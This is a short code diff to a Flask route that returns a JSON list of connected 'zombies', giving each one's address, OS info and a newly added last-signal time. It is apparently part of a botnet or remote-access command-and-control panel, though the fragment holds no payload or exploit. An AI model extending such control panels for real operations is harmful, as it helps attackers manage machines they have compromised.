@@ -37,10 +37,10 @@ def get_zombies_url_func(server_module_var):
         return redirect('/login', code=302)
 
     if ((server_module_var is not None) and (server_module_var.connection_status)):
-        zombies_addr_and_comm_list = server_module_var.zombies_addresses_and_communicators_list
+        zombies_addr_and_comm_list = server_module_var.zombies_addresses_and_tokens
         temp_list = []  # store data before sending
         for ac in zombies_addr_and_comm_list:
-            temp_list.append([ac[0], ac[2]['os_info']])
+            temp_list.append([ac[0], ac[3]['os_info'], '  [Last Signal : ' + ac[2] + ']'])
 
         return jsonify(temp_list)
 
